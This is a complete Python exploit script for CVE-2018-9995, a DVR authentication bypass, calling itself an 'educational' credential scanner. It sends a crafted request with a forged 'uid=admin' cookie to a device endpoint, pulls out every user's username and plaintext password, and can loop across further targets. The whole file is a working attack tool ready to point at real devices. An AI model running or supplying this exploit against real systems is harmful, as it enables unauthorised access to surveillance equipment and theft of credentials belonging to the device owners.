#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
DVR Credential Scanner - Educational tool for CVE-2018-9995
This tool demonstrates the vulnerability in certain DVR systems that exposes credentials.
For educational purposes only.
"""
import json
import argparse
import requests
import tableprint as tp
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored terminal output
init()

# ANSI Colors using colorama for better cross-platform compatibility
class Colors:
    BLUE    = Fore.BLUE
    GREEN   = Fore.GREEN
    RED     = Fore.RED
    DEFAULT = Style.RESET_ALL
    YELLOW  = Fore.YELLOW
    WHITE   = Fore.WHITE
    BOLD    = Style.BRIGHT

# Banner
BANNER = f"""
{Colors.GREEN}{Colors.BOLD}
  ____  __     __  _____     _____                            
 |  _ \\ \\ \\   / / |  __ \\   / ____|                           
 | | | | \\ \\_/ /  | |__) | | (___   ___ __ _ _ __  _ __   ___ _ __ 
 | | | |  \\   /   |  _  /   \\___ \\ / __/ _` | '_ \\| '_ \\ / _ \\ '__|
 | |_| |   | |    | | \\ \\   ____) | (_| (_| | | | | | | |  __/ |   
 |____/    |_|    |_|  \\_\\ |_____/ \\___\\__,_|_| |_|_| |_|\\___|_|   
                                                        
 [*] CVE-2018-9995 | DVR Credential Scanner
 [*] Educational purposes only
{Colors.DEFAULT}
"""

def parse_arguments():
    """Parse command line arguments or prompt user for input if not provided."""
    parser = argparse.ArgumentParser(
        prog='dvr_scanner.py',
        description='[+] DVR Credential Scanner - Educational tool for CVE-2018-9995',
        epilog='[+] Example: python dvr_scanner.py --host 192.168.1.101 --port 81'
    )

    parser.add_argument('--host', dest="HOST", help='Target host')
    parser.add_argument('--port', dest="PORT", help='Target port', default=80)
    parser.add_argument('--timeout', dest="TIMEOUT", help='Connection timeout in seconds', default=10, type=int)

    args = parser.parse_args()
    
    # If host is not provided as a command line argument, prompt user for it
    if not args.HOST:
        args.HOST = input(f"{Colors.BLUE}[?] Enter target host: {Colors.DEFAULT}")
    
    # If port is not provided, prompt user for it (default is still 80)
    if args.PORT == 80:
        port_input = input(f"{Colors.BLUE}[?] Enter target port [{Colors.GREEN}80{Colors.BLUE}]: {Colors.DEFAULT}")
        if port_input.strip():
            args.PORT = port_input
    
    return args

def get_dvr_credentials(host, port, timeout=10):
    """Attempt to extract credentials from the DVR using CVE-2018-9995."""
    full_url = f"http://{host}:{port}/device.rsp?opt=user&cmd=list"
    base_url = f"http://{host}:{port}/"
    
    headers = {
        "Host": host,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
        "Content-Type": "text/html",
        "Cookie": "uid=admin"
    }
    
    try:
        response = requests.get(full_url, headers=headers, timeout=timeout)
        
        # Check if the response was successful
        if response.status_code != 200:
            print(f"{Colors.RED} [!] Error: HTTP Status Code {response.status_code}{Colors.DEFAULT}")
            return None
            
        # Try to parse the JSON response
        try:
            data = json.loads(response.text)
            return data
        except json.JSONDecodeError:
            print(f"{Colors.RED} [!] Error: Invalid JSON response{Colors.DEFAULT}")
            print(f" [>] Raw response: {response.text}")
            return None
            
    except requests.exceptions.Timeout:
        print(f"{Colors.RED} [!] Error: Connection timed out{Colors.DEFAULT}")
    except requests.exceptions.ConnectionError:
        print(f"{Colors.RED} [!] Error: Failed to connect to the host{Colors.DEFAULT}")
    except Exception as e:
        print(f"{Colors.RED} [!] Error: {str(e)}{Colors.DEFAULT}")
    
    return None

def display_credentials(data, host, port):
    """Display the extracted credentials in a nice table."""
    if not data or "list" not in data:
        print(f"{Colors.RED} [!] No credential data found{Colors.DEFAULT}")
        return
        
    try:
        user_list = data["list"]
        total_users = len(user_list)
        
        print(f"{Colors.GREEN}\n [+] DVR URL:\t\t{Colors.YELLOW}{host}:{port}{Colors.DEFAULT}")
        print(f"{Colors.GREEN} [+] Total Users:\t{Colors.YELLOW}{total_users}{Colors.DEFAULT}\n")
        
        if total_users == 0:
            print(f"{Colors.RED} [!] No users found{Colors.DEFAULT}")
            return
            
        # Prepare data for the table
        table_data = []
        for user in user_list:
            username = user.get("uid", "N/A")
            password = user.get("pwd", "N/A")
            role = user.get("role", "N/A")
            table_data.append([username, password, role])
            
        # Define table headers
        headers = [
            f"{Colors.GREEN}Username{Colors.DEFAULT}",
            f"{Colors.GREEN}Password{Colors.DEFAULT}",
            f"{Colors.GREEN}Role ID{Colors.DEFAULT}"
        ]
        
        # Display table
        tp.table(table_data, headers, width=20)
        
    except Exception as e:
        print(f"{Colors.RED} [!] Error displaying credentials: {str(e)}{Colors.DEFAULT}")
        print(f" [>] Raw data: {data}")

def main():
    """Main function."""
    print(BANNER)
    
    # Parse command line arguments or get user input
    args = parse_arguments()
    host = args.HOST
    port = args.PORT
    timeout = args.TIMEOUT
    
    # Try to get credentials
    print(f"{Colors.BLUE} [*] Connecting to {host}:{port}...{Colors.DEFAULT}")
    data = get_dvr_credentials(host, port, timeout)
    
    if data:
        display_credentials(data, host, port)
    else:
        print(f"{Colors.RED} [!] Failed to retrieve credentials{Colors.DEFAULT}")
        
    print("\n")
    
    # Ask if user wants to scan another target
    while True:
        again = input(f"{Colors.BLUE}[?] Scan another target? (y/n): {Colors.DEFAULT}").lower()
        if again == 'y':
            host = input(f"{Colors.BLUE}[?] Enter target host: {Colors.DEFAULT}")
            port_input = input(f"{Colors.BLUE}[?] Enter target port [{Colors.GREEN}80{Colors.BLUE}]: {Colors.DEFAULT}")
            port = port_input if port_input.strip() else "80"
            
            print(f"{Colors.BLUE} [*] Connecting to {host}:{port}...{Colors.DEFAULT}")
            data = get_dvr_credentials(host, port, timeout)
            
            if data:
                display_credentials(data, host, port)
            else:
                print(f"{Colors.RED} [!] Failed to retrieve credentials{Colors.DEFAULT}")
            
            print("\n")
        else:
            break

if __name__ == "__main__":
    main() 